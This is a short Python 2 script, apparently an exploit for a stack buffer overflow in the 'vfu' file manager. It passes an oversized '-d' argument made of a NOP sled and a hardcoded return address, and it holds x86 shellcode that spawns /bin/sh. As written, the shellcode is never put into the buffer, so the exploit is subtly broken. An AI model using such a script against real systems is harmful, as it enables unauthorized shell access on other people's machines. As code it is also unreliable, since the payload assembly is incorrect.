import subprocess
import os



def main():
	buffersize =  803
	nopsled = "\x90"
	shellcode = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
	eip = "\x10\xf0\xff\xbf"
	buffer = nopsled * (buffersize-len(shellcode)) + eip
	
	try:
		os.environ['TERM']='linux'
		print "HERE! Running:"
		return subprocess.call(["vfu","-d", buffer])
	except OSError as e:
		if e.errno == os.errno.ENOENT:
			print "VFU not found!"
		else:
			print "Error executing exploit"
		raise

